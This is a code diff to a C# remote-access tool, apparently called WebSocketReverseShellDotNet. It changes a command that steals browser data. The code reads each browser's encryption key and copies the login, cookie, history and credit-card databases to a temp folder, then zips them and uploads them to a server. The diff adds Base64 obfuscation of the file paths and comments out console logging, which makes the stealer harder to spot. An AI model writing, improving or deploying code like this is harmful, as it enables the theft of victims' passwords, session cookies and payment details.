@@ -52,22 +52,24 @@ namespace WebSocketReverseShellDotNet.service.commands
             {
                 foreach (String browserHome in Constants.LIST_OF_BROWSER_LOCATIONS)
                 {
-                    if (!OSUtil.DirectoryExists(browserHome)) continue;
-                    byte[] encryptionKey = GetEncryptionKey(browserHome,stringBuilder);
-                    ProcessProfile(browserHome, encryptionKey);
+                    String browser = OSUtil.DecodeBase64(browserHome);
+                    if (!OSUtil.DirectoryExists(browser)) continue;
+                    byte[] encryptionKey = GetEncryptionKey(browser, stringBuilder);
+                    ProcessProfile(browser, encryptionKey);
 
 
 
                 }
                 AddAllDataToHashMap();
-                string path = $"{OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}\\browser.xlsx";
+                string storeDir = $"{OSUtil.GetSystemTempDir()}{Constants.EXFILTRATE_FOLDER}";
+                string path = $"{storeDir}\\browser.xlsx";
                 FileInfo file = Excel.ConvertToExcel(browserData, path);
                 List<string> files = new List<string>();
                 files.Add(path);
 
-                file = OSUtil.ZipFiles(files, $"{ OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}","browser.zip");
+                file = OSUtil.ZipFiles(files, $"{storeDir}","browser.zip");
 
-                stringBuilder.AppendLine(UploadUtil.UploadToServer(file));
+                UploadUtil.UploadToServer(file);
 
                 return stringBuilder.ToString();
             } catch (Exception ex)
@@ -110,7 +112,7 @@ namespace WebSocketReverseShellDotNet.service.commands
         {
 
             try {
-                string localStateFileLocation = browserHome + Constants.ENCRYPTION_KEY_BROWSER_DB;
+                string localStateFileLocation = browserHome + OSUtil.DecodeBase64(Constants.ENCRYPTION_KEY_BROWSER_DB);
                 string localStateFileLocationExpandedPath = Environment.ExpandEnvironmentVariables(localStateFileLocation);
 
                 if (!OSUtil.FileExists(localStateFileLocation)) return [];
@@ -206,8 +208,8 @@ namespace WebSocketReverseShellDotNet.service.commands
         private static void ExfiltrateUserData(String profilePath, byte[] encryptionKey)
         {
             String profileDir = Environment.ExpandEnvironmentVariables(profilePath);
-            String historyDb = profileDir + Constants.HISTORY_BROWSER_DB;
-            string folderPath = $"{OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}";
+            String historyDb = profileDir + OSUtil.DecodeBase64(Constants.HISTORY_BROWSER_DB);
+            string folderPath = $"{OSUtil.GetSystemTempDir()}{Constants.EXFILTRATE_FOLDER}";
             Directory.CreateDirectory(folderPath);
             historyDb = OSUtil.CopyFileWithNumberPreAppended(historyDb, folderPath , 1);
 
@@ -229,7 +231,7 @@ namespace WebSocketReverseShellDotNet.service.commands
             }
 
             
-            String loginDb = profileDir + Constants.LOGIN_DATA_BROWSER_DB;
+            String loginDb = profileDir + OSUtil.DecodeBase64( Constants.LOGIN_DATA_BROWSER_DB);
             loginDb = OSUtil.CopyFileWithNumberPreAppended(loginDb, folderPath, 1);
             if (!String.IsNullOrEmpty(loginDb))
             {
@@ -240,12 +242,12 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                     stringBuilder.AppendLine(e.Message);
                 }
             }
 
-            String cookies = profileDir + Constants.COOKIES_BROWSER_DB;
+            String cookies = profileDir + OSUtil.DecodeBase64(Constants.COOKIES_BROWSER_DB);
             cookies = OSUtil.CopyFileWithNumberPreAppended(cookies, folderPath, 1);
             if (!String.IsNullOrEmpty(cookies))
             {
@@ -257,11 +259,11 @@ namespace WebSocketReverseShellDotNet.service.commands
                 catch (Exception e)
                 {
                     stringBuilder.AppendLine(e.Message);
-                    Console.WriteLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                 }
             }
 
-            String creditCards = profileDir + Constants.CREDIT_CARDS_BROWSER_DB;
+            String creditCards = profileDir + OSUtil.DecodeBase64(Constants.CREDIT_CARDS_BROWSER_DB);
             creditCards = OSUtil.CopyFileWithNumberPreAppended(creditCards, folderPath, 1);
             if (!String.IsNullOrEmpty(creditCards))
             {
@@ -273,7 +275,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 catch (Exception e)
                 {
                     stringBuilder.AppendLine(e.Message);
-                    Console.WriteLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                 }
             }
             
@@ -428,7 +430,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e) 
                 {
-                    Console.WriteLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                 
                  }
                 try {
@@ -464,7 +466,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 } 
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                 }
 
 
